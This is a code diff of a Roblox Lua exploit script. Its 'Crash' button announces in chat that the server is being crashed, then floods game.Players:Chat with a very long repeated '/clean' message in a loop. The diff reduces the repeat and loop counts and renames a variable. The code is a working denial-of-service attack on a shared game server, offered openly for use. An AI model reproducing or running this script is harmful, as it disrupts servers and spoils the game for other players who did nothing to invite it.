@@ -139,13 +139,13 @@ end)
   Crash.MouseButton1Down:connect(function()
   wait(0) local A_1 = "Crashing the Server with 22 Dupe.." local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
 
-local natass = "/"
+	local prefixe = "/"
 
-    local Message = (natass.. "clean".." "):rep(10000000)
+	local Message = (prefixe.. "clean".." "):rep(100000)
 
-    for i = 1, 75000 do
-        game.Players:Chat(Message)
-    end
+	for i = 1, 750 do
+			game.Players:Chat(Message)
+	end
 
     local notifSound = Instance.new("Sound",workspace)
     	notifSound.PlaybackSpeed = 1
